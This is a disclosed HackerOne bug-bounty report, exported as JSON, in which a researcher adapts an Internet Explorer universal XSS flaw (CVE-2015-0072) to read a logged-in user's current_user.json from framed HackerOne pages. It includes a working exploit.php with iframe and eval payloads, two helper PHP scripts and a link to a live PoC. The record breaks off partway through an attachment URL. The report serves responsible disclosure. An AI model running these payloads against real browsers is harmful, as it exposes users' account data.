{"id":108056,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDgwNTY=","url":"https://hackerone.com/reports/108056","title":"HackerOne is still prone to Internet Explorer UXSS","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2016-01-04T11:34:44.163Z","submitted_at":"2016-01-04T11:34:44.163Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"zombiehelp54","url":"/zombiehelp54","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-04-19T18:16:55.902Z","bug_reporter_agreed_on_going_public_at":"2017-04-19T13:44:19.317Z","team_member_agreed_on_going_public_at":"2017-04-19T18:16:55.874Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi, I have managed to leverage CVE 2015-0072, so that the attack will work with any framed resource protected by `X-Frame-Options: DENY` header.\nAccording to #103787, only https://hackerone.com/cdn-cgi/trace was unprotected and now its already fixed. In my PoC I used several X-Frame-Options protected resources of HackerOne and the attack was executed successfully.\n\nProof Of Concept\n--------------------------\n1. exploit.php\n\nI added alert() message after executing the payload (read content of current_user.json) because responseText  wasn't readable as steadyState stick at 1 and status at 0\n\n```\n\u003ciframe src=\"redirect.php?\u003c? echo rand(); ?\u003e\" style=\"\"\u003e\u003c/iframe\u003e\n\u003ciframe src=\"https://hackerone.com/assets/news/vulnerabilities_fixed/vulnfixed-652ab9bb4eac2826a0fc8a2fae551115.png?\u003c? echo rand(); ?\u003e\" style=\"\"\u003e\u003c/iframe\u003e\n\u003cscript\u003e\ntop[0].eval('_=top[1];xhttp=new XMLHttpRequest();xhttp.open(\"get\",\"delay.php?\u003c? echo rand(); ?\u003e\",false);xhttp.send(); _.location=\"javascript:http=new XMLHttpRequest(); url=\\'https://hackerone.com/current_user.json\\';http.open(\\'GET\\', url, true);http.onreadystatechange = function(){if(http.readyState == 4 \u0026\u0026 http.status == 200)console.log(http.responseText);}; http.send(); alert(\\'No need to close this, already done!\\'); \"');\n\u003c/script\u003e\n```\n\n2- redirect.php\n\n```\n\u003c?php \nheader(\"Location: https://hackerone.com/assets/news/vulnerabilities_fixed/vulnfixed-652ab9bb4eac2826a0fc8a2fae551115.png?\".rand()); \nexit(); \n?\u003e\n```\n\n3- delay.php\n\n```\n\u003c?php \nsleep(5);\necho \"zombiehelp54\";\nexit(); \n?\u003e\n```\n\nLive PoC\n---------------\nI have tested this live PoC on my IE 11.0.9600.17.633 updated February 2015 and also on IE 11 of Windows Server 2012 R2 and it worked as expected (see screenshots).\nI also tried many resources of HackerOne and all is X-Frame-Options protected.\nJust open any  vulnerable IE (9,10,11 without MS15-018 applied) and turn on console\nGo to http://alazzazpp.com/myuxss/exploit.php and your current_user.json will be logged to console.\n\nI couldn't find a mitigation to this, I hope you do.\nThanks;\n\n","vulnerability_information_html":"\u003cp\u003eHi, I have managed to leverage CVE 2015-0072, so that the attack will work with any framed resource protected by \u003ccode\u003eX-Frame-Options: DENY\u003c/code\u003e header.\u003cbr\u003e\nAccording to \u003ca href=\"/reports/103787\"\u003e#103787\u003c/a\u003e, only \u003ca title=\"https://hackerone.com/cdn-cgi/trace\" href=\"https://hackerone.com/cdn-cgi/trace\"\u003ehttps://hackerone.com/cdn-cgi/trace\u003c/a\u003e was unprotected and now its already fixed. In my PoC I used several X-Frame-Options protected resources of HackerOne and the attack was executed successfully.\u003c/p\u003e\n\n\u003ch2 id=\"proof-of-concept\"\u003eProof Of Concept\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eexploit.php\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eI added alert() message after executing the payload (read content of current_user.json) because responseText  wasn\u0026#39;t readable as steadyState stick at 1 and status at 0\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;iframe src=\u0026quot;redirect.php?\u0026lt;? echo rand(); ?\u0026gt;\u0026quot; style=\u0026quot;\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\n\u0026lt;iframe src=\u0026quot;https://hackerone.com/assets/news/vulnerabilities_fixed/vulnfixed-652ab9bb4eac2826a0fc8a2fae551115.png?\u0026lt;? echo rand(); ?\u0026gt;\u0026quot; style=\u0026quot;\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\n\u0026lt;script\u0026gt;\ntop[0].eval(\u0026#39;_=top[1];xhttp=new XMLHttpRequest();xhttp.open(\u0026quot;get\u0026quot;,\u0026quot;delay.php?\u0026lt;? echo rand(); ?\u0026gt;\u0026quot;,false);xhttp.send(); _.location=\u0026quot;javascript:http=new XMLHttpRequest(); url=\\\u0026#39;https://hackerone.com/current_user.json\\\u0026#39;;http.open(\\\u0026#39;GET\\\u0026#39;, url, true);http.onreadystatechange = function(){if(http.readyState == 4 \u0026amp;\u0026amp; http.status == 200)console.log(http.responseText);}; http.send(); alert(\\\u0026#39;No need to close this, already done!\\\u0026#39;); \u0026quot;\u0026#39;);\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e2- redirect.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e \n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Location: https://hackerone.com/assets/news/vulnerabilities_fixed/vulnfixed-652ab9bb4eac2826a0fc8a2fae551115.png?\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003erand\u003c/span\u003e\u003cspan class=\"p\"\u003e());\u003c/span\u003e \n\u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e \n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e3- delay.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e \n\u003cspan class=\"nb\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;zombiehelp54\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e \n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"live-poc\"\u003eLive PoC\u003c/h2\u003e\n\n\u003cp\u003eI have tested this live PoC on my IE 11.0.9600.17.633 updated February 2015 and also on IE 11 of Windows Server 2012 R2 and it worked as expected (see screenshots).\u003cbr\u003e\nI also tried many resources of HackerOne and all is X-Frame-Options protected.\u003cbr\u003e\nJust open any  vulnerable IE (9,10,11 without MS15-018 applied) and turn on console\u003cbr\u003e\nGo to \u003ca title=\"http://alazzazpp.com/myuxss/exploit.php\" href=\"/redirect?url=http%3A%2F%2Falazzazpp.com%2Fmyuxss%2Fexploit.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://alazzazpp.com/myuxss/exploit.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and your current_user.json will be logged to console.\u003c/p\u003e\n\n\u003cp\u003eI couldn\u0026#39;t find a mitigation to this, I hope you do.\u003cbr\u003e\nThanks;\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":67710,"file_name":"redirect.php","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/067/710/7cf45113f86497fb3c47e5fd63f9685e2ac92356/redirect.php?response-content-disposition=attachment%3B%20filename%3D%22redirect.php%22%3B%20filename%2A%3DUTF-8%27%27redirect.php\u0026response-content-type=text%2Fx-php\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ25CUMV77%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041510Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAzPBxfjhI%2FOiR%2B1g7qgHtu%2BTSWR72ZbKmRPdv61x9tZAiEA7d5guv7RrcybHHoMbJ5xcSYkf5cIncRQif%2BDwrhUxL4qtAMIURABGgwwMTM2MTkyNzQ4NDkiDLU8cXGXokn2dJzgWyqRA5t82BwvWjjXR1flrxPY1G8nb%2BmyZbhMX7bIDSshUvXOZWrYMuqnjFp50lwKRioT0tqSyswhE%2FmxcGN2dZffgFfm45Y15zW32QivQspJz2zpwJxFycBtjnRvl%2FMGegWgMTliaPfGzxGYLkpzI0cHFjLk%2BKaC50Jxtx51oChC%2BCytCTVfzOq2Ax%2BcOQ92r8%2FEVvUqeZR%2BTPUidVPdANT%2FJyfcDkVZSZzQz9EjBhPlfadpw5dBs4QJ%2BDdADV0MdhKltTlk%2FyXYCPqWqRloAtWd1nGtuRb2iTe6dG%2FjlvEdGxsyq3XSWVpxob44SfkNT25WtiGoWTrQta7tHUBAIeejr1qo89oGEttSf7d8Lku1wWROst97KwhMf%2B%2Bj34q6jzK8i1Hw8XE5vydIGbQfSR452%2FCUDzasjIErk2%2F0Ktvsz%2Bx3csi5j3IwrXlZf4YgORAmKN1LdQQkzS%2BV1sgEfBg4MiQjSsKotzm%2FUgXxu10BwEW2Dhb8oNMpsZ1FjdjbCQGOQD7Feifp2fVzXkXhF1DMwndWMOrpqf8FOusBKlCtIwN5UHYU%2F5Q2IWJVa2twlUdU6iZvdqJG%2FbyL1HncSkMTTf174kVtrd08ZtfhfQ%2B%2FGZMeT3%2BWmMgtiSxiN8zlfLWyyOmRNNNrcZLeamXU8gijNm5O%2FRQyUqS40M%2B09rACFWxFC6eSAj2%2BBOBxHA6bEgtgV3Z6D4uLX3zxwXXu%2BF%2BhhCTXgcbobecE2HXiCLYk05uES7bSCIeUoggVUmunssom%2Bu8yCYvg2qvqpHVNwChBmtVZLiGt79EkgpsqfgvK113rJiRtjBkxEHINtbd%2FcmRPwl2VUc1W%2BEpCc%2FxxQcCayPndzJKPSw%3D%3D\u0026X-Amz-Signature=f3123721368de5b3dd9853d52291cad59d31e159d96563328db4512682f472ac","file_size":151,"type":"text/x-php"},{"id":67712,"file_name":"exploit.php","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/067/712/15ec637cc05cbcdb9574d88335fb3199f9b16a5d/exploit.php?response-content-disposition=attachment%3B%20filename%3D%22exploit.php%22%3B%20filename%2A%3DUTF-8%27%27exploit.php\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ25CUMV77%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041510Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAzPBxfjhI%2FOiR%2B1g7qgHtu%2BTSWR72ZbKmRPdv61x9tZAiEA7d5guv7RrcybHHoMbJ5xcSYkf5cIncRQif%2BDwrhUxL4qtAMIURABGgwwMTM2MTkyNzQ4NDkiDLU8cXGXokn2dJzgWyqRA5t82BwvWjjXR1flrxPY1G8nb%2BmyZbhMX7bIDSshUvXOZWrYMuqnjFp50lwKRioT0tqSyswhE%2FmxcGN2dZffgFfm45Y15zW32QivQspJz2zpwJxFycBtjnRvl%2FMGegWgMTliaPfGzxGYLkpzI0cHFjLk%2BKaC50Jxtx51oChC%2BCytCTVfzOq2Ax%2BcOQ92r8%2FEVvUqeZR%2BTPUidVPdANT%2FJyfcDkVZSZzQz9EjBhPlfadpw5dBs4QJ%2BDdADV0MdhKltTlk%2FyXYCPqWqRloAtWd1nGtuRb2iTe6dG%2FjlvEdGxsyq3XSWVpxob44SfkNT25WtiGoWTrQta7tHUBAIeejr1qo89oGEttSf7d8Lku1wWROst97KwhMf%2B%2Bj34q6jzK8i1Hw8XE5vydIGbQfSR452%2FCUDzasjIErk2%2F0Ktvsz%2Bx3csi5j3IwrXlZf4YgORAmKN1LdQQkzS%2BV1sgEfBg4MiQjSsKotzm%2FUgXxu10BwEW2Dhb8oNMpsZ1FjdjbCQGOQD7Feifp2fVzXkXhF1DMwndWMOrpqf8FOusBKlCtIwN5UHYU%2F5Q2IWJVa2twlUdU6iZvdqJG%2FbyL1HncSkMTTf174kVtrd08ZtfhfQ%2B%2FGZMeT3%2BWmMgtiSxiN8zlfLWyyOmRNNNrcZLeamXU8gijNm5O%2FRQyUqS40M%2B09rACFWxFC6eSAj2%2BBOBxHA6bEgtgV3Z6D4uLX3zxwXXu%2BF%2BhhCTXgcbobecE2HXiCLYk05uES7bSCIeUoggVUmunssom%2Bu8yCYvg2qvqpHVNwChBmtVZLiGt79EkgpsqfgvK113rJiRtjBkxEHINtbd%2FcmRPwl2VUc1W%2BEpCc%2FxxQcCayPndzJKPSw%3D%3D\u0026X-Amz-Signature=6973c6f7cb590a2d21dcb5c3d2207f57b547640503dd715189c8b121beed09e5","file_size":668,"type":"text/html"},{"id":67713,"file_name":"delay.php","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/067/713/4746914313a76d16025b32b666cebff1f3bd0f1d/delay.php?response-content-disposition=attachment%3B%20filename%3D%22delay.php%22%3B%20filename%2A%3DUTF-8%27%27delay.php\u0026response-content-type=text%2Fx-php\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ25CUMV77%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041510Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAzPBxfjhI%2FOiR%2B1g7qgHtu%2BTSWR72ZbKmRPdv61x9tZAiEA7d5guv7RrcybHHoMbJ5xcSYkf5cIncRQif%2BDwrhUxL4qtAMIURABGgwwMTM2MTkyNzQ4NDkiDLU8cXGXokn2dJzgWyqRA5t82BwvWjjXR1flrxPY1G8nb%2BmyZbhMX7bIDSshUvXOZWrYMuqnjFp50lwKRioT0tqSyswhE%2FmxcGN2dZffgFfm45Y15zW32QivQspJz2zpwJxFycBtjnRvl%2FMGegWgMTliaPfGzxGYLkpzI0cHFjLk%2BKaC50Jxtx51oChC%2BCytCTVfzOq2Ax%2BcOQ92r8%2FEVvUqeZR%2BTPUidVPdANT%2FJyfcDkVZSZzQz9EjBhPlfadpw5dBs4QJ%2BDdADV0MdhKltTlk%2FyXYCPqWqRloAtWd1nGtuRb2iTe6dG%2FjlvEdGxsyq3XSWVpxob44SfkNT25WtiGoWTrQta7tHUBAIeejr1qo89oGEttSf7d8Lku1wWROst97KwhMf%2B%2Bj34q6jzK8i1Hw8XE5vydIGbQfSR452%2FCUDzasjIErk2%2F0Ktvsz%2Bx3csi5j3IwrXlZf4YgORAmKN1LdQQkzS%2BV1sgEfBg4MiQjSsKotzm%2FUgXxu10BwEW2Dhb8oNMpsZ1FjdjbCQGOQD7Feifp2fVzXkXhF1DMwndWMOrpqf8FOusBKlCtIwN5UHYU%2F5Q2IWJVa2twlUdU6iZvdqJG%2FbyL1HncSkMTTf174kVtrd08ZtfhfQ%2B%2FGZMeT3%2BWmMgtiSxiN8zlfLWyyOmRNNNrcZLeamXU8gijNm5O%2FRQyUqS40M%2B09rACFWxFC6eSAj2%2BBOBxHA6bEgtgV3Z6D4uLX3zxwXXu%2BF%2BhhCTXgcbobecE2HXiCLYk05uES7bSCIeUoggVUmunssom%2Bu8yCYvg2qvqpHVNwChBmtVZLiGt79EkgpsqfgvK113rJiRtjBkxEHINtbd%2FcmRPwl2VUc1W%2BEpCc%2FxxQcCayPndzJKPSw%3D%3D\u0026X-Amz-Signature=731394c4f2246d48497e2720d25dc5699fda50254eb8d7df8a521c1b309d02bd","file_size":41,"type":"text/x-php"},{"id":67714,"file_name":"hackerone_uxss_2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/067/714/8ef9f34a6ae988e9078705e1dd127cbd7603dc0b/hackerone_uxss_2.png?response-content-disposition=attachment%3B%20filename%3D%22hackerone_uxss_2.png%22%3B%20filename%2A%3DUTF-8%27%27hackerone_uxss_2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ25CUMV77%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041510Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAzPBxfjhI%2FOiR%2B1g7qgHtu%2BTSWR72ZbKmRPdv61x9tZAiEA7d5guv7RrcybHHoMbJ5xcSYkf5cIncRQif%2BDwrhUxL4qtAMIURABGgwwMTM2MTkyNzQ4NDkiDLU8cXGXokn2dJzgWyqRA5t82BwvWjjXR1flrxPY1G8nb%2BmyZbhMX7bIDSshUvXOZWrYMuqnjFp50lwKRioT0tqSyswhE%2FmxcGN2dZffgFfm45Y15zW32QivQspJz2zpwJxFycBtjnRvl%2FMGegWgMTliaPfGzxGYLkpzI0cHFjLk%2BKaC50Jxtx51oChC%2BCytCTVfzOq2Ax%2BcOQ92r8%2FEVvUqeZR%2BTPUidVPdANT%2FJyfcDkVZSZzQz9EjBhPlfadpw5dBs4QJ%2BDdADV0MdhKltTlk%2FyXYCPqWqRloAtWd1nGtuRb2iTe6dG%2FjlvEdGxsyq3XSWVpxob44SfkNT25WtiGoWTrQta7tHUBAIeejr1qo89oGEttSf7d8Lku1wWROst97KwhMf%2B%2Bj34q6jzK8i1Hw8XE5vydIGbQfSR452%2FCUDzasjIErk2%2F0Ktvsz%2Bx3csi5j3IwrXlZf4YgORAmKN1LdQQkzS%2BV1sgEfBg4MiQjSsKotzm%2FUgXxu10BwEW2Dhb8oNMpsZ1FjdjbCQGOQD7Feifp2fVzXkXhF1DMwndWMOrpqf8FOusBKlCtIwN5UHYU%2F5Q2IWJVa2twlUdU6iZvdqJG%2FbyL1HncSkMTTf174kVtrd08ZtfhfQ%2B%2FGZMeT3%2BWmMgtiSxiN8zlfLWyyOmRNNNrcZLeamXU8gijNm5O%2FRQyUqS40M%2B09rACFWxFC6eSAj2%2BBOBxHA6bEgtgV3Z6D4uLX3zxwXXu%2BF%2BhhCTXgcbobecE2HXiCLYk05uES7bSCIeUoggVUmunssom%2Bu8yCYvg2qvqpHVNwChBmtVZLiGt79EkgpsqfgvK113rJiRtjBkxEHINtbd%2FcmRPwl2VUc1W%2BEpCc%2FxxQcCayPndzJKPSw%3D%3D\u0026X-Amz-Signature=de762ac69bf0ec2ffcc08daa6a285dbef4b988e71a3fa68aaa09f0b759750cad","file_size":44564,"type":"image/png"},{"id":67715,"file_name":"hackerone_uxss_1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/067/715/137346229a5d9bf44fdc3619cc7491ef4f76109b/hackerone_uxss_1.png?response-content-disposition=attachment%3B%20filename%3D%22hackerone_uxss_1.png%22%3B%20filename%2A%3DUTF-8%27%27hackerone_uxss_1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ25CUMV77%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041510Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAzPBxfjhI%2FOiR%2B1g7qgHtu%2BTSWR72ZbKmRPdv61x9tZAiEA7d5guv7RrcybHHoMbJ5xcSYkf5cIncRQif%2BDwrhUxL4qtAMIURABGgwwMTM2MTkyNzQ4NDkiDLU8cXGXokn2dJzgWyqRA5t82BwvWjjXR1flrxPY1G8nb%2BmyZbhMX7bIDSshUvXOZWrYMuqnjFp50lwKRioT0tqSyswhE%2FmxcGN2dZffgFfm45Y15zW32QivQspJz2zpwJxFycBtjnRvl%2FMGegWgMTliaPfGzxGYLkpzI0cHFjLk%2BKaC50Jxtx51oChC%2BCytCTVfzOq2Ax%2BcOQ92r8%2FEVvUqeZR%2BTPUidVPdANT%2FJyfcDkVZSZzQz9EjBhPlfadpw5dBs4QJ%2BDdADV0MdhKltTlk%2FyXYCPqWqRloAtWd1nGtuRb2iTe6dG%2FjlvEdGxsyq3XSWVpxob44SfkNT25WtiGoWTrQta7tHUBAIeejr1qo89oGEttSf7d8Lku1wWROst97KwhMf%2B%2Bj34q6jzK8i1Hw8XE5vydIGbQfSR452%2FCUDzasjIErk2%2F0Ktvsz%2Bx3csi5j3IwrXlZf4YgORAmKN1LdQQkzS%2BV1sgEfBg4MiQjSsKotzm%2FUgXxu10BwEW2Dhb8oNMpsZ1FjdjbCQGOQD7Feifp2fVzXkXhF1DMwndWMOrpqf8FOusBKlCtIwN5UHYU%2F5Q2IWJVa2twlUdU6iZvdqJG%2FbyL1HncSkMTTf174kVtrd08ZtfhfQ%2B%2FGZMeT3%2BWmMgtiSxiN8zlfLWyyOmRNNNrcZLeamXU8gijNm5O%2FRQyUqS40M%2B09rACFWxFC6eSAj2%2BBOBxHA6bEgtgV3Z6D4uLX3zxwXXu%2BF%2BhhCTXgcbobecE2HXiCLYk05uES7bSCIeUoggVUmunssom%2Bu8yCYvg2qvqpHVNwChBmtVZLiGt79EkgpsqfgvK113rJiRtjBkxEHINtbd%2FcmRPwl2VUc1W%2BEpCc%2FxxQcCayPndzJKPSw%3D%3D\u0026X-Amz-Signature=31b1a9407e4a72c5362e81b2a5466bf8b2e6da37ded01a6865524a732443b234","file_size":110092,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":20,"voters":["hunter","inhibitor181","bogdantcaciuc","madrobot","muhammad_uwais","eveeez","r3y","malcolmx","xhzeem","m16","and 10 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":740302,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Random numbers are being added to URLs so that no need to clear IE cache every try.","markdown_message":"\u003cp\u003eRandom numbers are being added to URLs so that no need to clear IE cache every try.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-04T11:39:29.219Z","updated_at":"2016-01-04T11:39:29.219Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":740684,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here are another two screenshots of IE 11 on Windows Server 2012 R2 and Windows 8.1","markdown_message":"\u003cp\u003eHere are another two screenshots of IE 11 on Windows Server 2012 R2 and Windows 8.1\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-04T16:08:17.397Z","updated_at":"2016-01-04T16:08:17.397Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":67763,"filename":"hackerone_ie_uxss_win8.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/067/763/80900e37a09b8836d09bd7cd61083da50a25d646/hackerone_ie_uxss_win8.png?response-content-disposition=attachment%3B%20filename%3D%22hackerone_ie_uxss_win8.png%22%3B%20filename%2A%3DUTF-8%27%27hackerone_ie_uxss_win8.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ25CUMV77%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041511Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAzPBxfjhI%2FOiR%2B1g7qgHtu%2BTSWR72ZbKmRPdv61x9tZAiEA7d5guv7RrcybHHoMbJ5xcSYkf5cIncRQif%2BDwrhUxL4qtAMIURABGgwwMTM2MTkyNzQ4NDkiDLU8cXGXokn2dJzgWyqRA5t82BwvWjjXR1flrxPY1G8nb%2BmyZbhMX7bIDSshUvXOZWrYMuqnjFp50lwKRioT0tqSyswhE%2FmxcGN2dZffgFfm45Y15zW32QivQspJz2zpwJxFycBtjnRvl%2FMGegWgMTliaPfGzxGYLkpzI0cHFjLk%2BKaC50Jxtx51oChC%2BCytCTVfzOq2Ax%2BcOQ92r8%2FEVvUqeZR%2BTPUidVPdANT%2FJyfcDkVZSZzQz9EjBhPlfadpw5dBs4QJ%2BDdADV0MdhKltTlk%2FyXYCPqWqRloAtWd1nGtuRb2iTe6dG%2FjlvEdGxsyq3XSWVpxob44SfkNT25WtiGoWTrQta7tHUBAIeejr1qo89oGEttSf7d8Lku1wWROst97KwhMf%2B%2Bj34q6jzK8i1Hw8XE5vydIGbQfSR452%2FCUDzasjIErk2%2F0Ktvsz%2Bx3csi5j3IwrXlZf4YgORAmKN1LdQQkzS%2BV1sgEfBg4MiQjSsKotzm%2FUgXxu10BwEW2Dhb8oNMpsZ1FjdjbCQGOQD7Feifp2fVzXkXhF1DMwndWMOrpqf8FOusBKlCtIwN5UHYU%2F5Q2IWJVa2twlUdU6iZvdqJG%2FbyL1HncSkMTTf174kVtrd08ZtfhfQ%2B%2FGZMeT3%2BWmMgtiSxiN8zlfLWyyOmRNNNrcZLeamXU8gijNm5O%2FRQyUqS40M%2B09rACFWxFC6eSAj2%2BBOBxHA6bEgtgV3Z6D4uLX3zxwXXu%2BF%2BhhCTXgcbobecE2HXiCLYk05uES7bSCIeUoggVUmunssom%2Bu8yCYvg2qvqpHVNwChBmtVZLiGt79EkgpsqfgvK113rJiRtjBkxEHINtbd%2FcmRPwl2VUc1W%2BEpCc%2FxxQcCayPndzJKPSw%3D%3D\u0026X-Amz-Signature=1bec7dc492aa5753bd58eb10005bae7f6162cc9723e7ff7b492fe0d8b3aa5bf6"},{"id":67764,"filename":"hackerone_uxss_ie_win_server_2012_r2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/067/764/dfce99eb6b55421953648d1bac23eaad22746fa2/hackerone_uxss_ie_win_server_2012_r2.png?response-content-disposition=attachment%3B%20filename%3D%22hackerone_uxss_ie_win_server_2012_r2.png%22%3B%20filename%2A%3DUTF-8%27%27h